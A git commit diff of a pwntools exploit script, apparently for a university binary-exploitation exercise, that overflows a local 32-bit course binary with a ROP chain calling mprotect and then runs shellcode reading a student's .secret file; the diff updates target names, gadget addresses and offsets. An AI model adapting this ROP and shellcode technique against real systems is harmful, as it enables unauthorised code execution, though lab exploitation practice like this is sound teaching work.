79d06cc9e6f25d398b0133c216806ff874671d89
dedkuzmich <91969553+dedkuzmich@users.noreply.github.com>
2024-03-22 12:54:25 +0200

    Linux

--- mkr1/10101_pwn.py
+++ mkr1/10101_pwn.py
@@ -3,51 +3,33 @@ from pwn import *
 
 context.arch = "i686"
 
-file_binary = "10101_YAKOBCHUK_Dmytro"
+file_binary = "10126_ZELENIN_Vladyslav"
 
 # FOR LINUX
-# env = {'LD_PRELOAD': 'libc.so.6', 'LD_ASLR': 'off'}
-# r = process(['setarch', '-R', './10101_YAKOBCHUK_Dmytro'], env = env)
-# pause()
+env = {'LD_PRELOAD': 'libc.so.6', 'LD_ASLR': 'off'}
+r = process(['setarch', '-R', './10126_ZELENIN_Vladyslav'], env = env)
+pause()
 
 # FOR WSL2
-def run_exploit(debug, file_breakpoints):
-    env = {"LD_PRELOAD": "libc.so.6", "LD_ASLR": "off"}
-    p = process(["setarch", "-R", f"./{file_binary}"], env = env)
-    if debug == True:
-        pid = util.proc.pidof(p)[0]
-
-        gdb = f"gdb -q -p {pid}"
-        if file_breakpoints:
-            gdb += f" -x {file_breakpoints}"
-            print(f"Use breakpoints from {file_breakpoints}")
-
-        new_tab = "wt -p 'PowerShell' -d ."  # Open new tab in Windows Terminal (PowerShell profile and current dir)
-        wsl = f"wsl -e bash -c '{gdb}\; exec $BASH'"
-        cmd = f"cmd.exe /c start {new_tab} {wsl}"
-        os.system(cmd)
-        util.proc.wait_for_debugger(pid)
-    return p
 
 
 file_breakpoints = "breaks32.gdb"
-r = run_exploit(True, file_breakpoints)
+# r = run_exploit(True, file_breakpoints)
 
-sc = asm(shellcraft.cat('10101_YAKOBCHUK_Dmytro.secret') + shellcraft.echo('\n') + shellcraft.exit(13))
+sc = asm(shellcraft.cat('10100_ILIN_Mykola.secret') + shellcraft.echo('\n') + shellcraft.exit(13))
 
 # GADGETS
-rnop = p32(0x08049d20)  # ret
-peax = p32(0x080b0cda)  # pop eax; ret
-peaxedxebx = p32(0x08058958)  # pop eax; pop edx; pop ebx; ret
-mecxeax = p32(0x08093df8)  # mov ecx, eax; mov eax, ecx; ret
-syscall = p32(0x08071c50)  # int 0x80; ret
+rnop = p32(0x08071934)  # ret
+peax = p32(0x080b0e7a)  # pop eax; ret
+peaxedxebx = p32(0x080585e8)  # pop eax; pop edx; pop ebx; ret
+mecxeax = p32(0x08093ec8)  # mov ecx, eax; mov eax, ecx; ret
+syscall = p32(0x08071940)  # int 0x80; ret
 
 rwx = p32(0x08048000)
-
-overflow = 898
+overflow = 329
 buf = b'A' * overflow
 buf += p32(1337)
-buf += rnop * 500
+buf += rnop * 300
 
 # mprotect rwx
 buf += peax
@@ -72,11 +54,14 @@ buf += syscall
 # jump shellcode
 buf += rwx
 
-buf = buf.ljust(4 * overflow + 4 + overflow + 4, b'B')
-buf += p32(0xffffd000)
+buf = buf.ljust(1653, b'B')
+# buf += p32(0xffffd000)
+# buf += p32(0xDDDDDDDD)
+buf += p32(0xffffd900)
 
+# buf = cyclic(6000)
 log.info('=== buffer')
-print(hexdump(buf))
+# print(hexdump(buf))
 r.readline()
 r.writeline(buf)
 r.readuntil(b'GRANTED!')
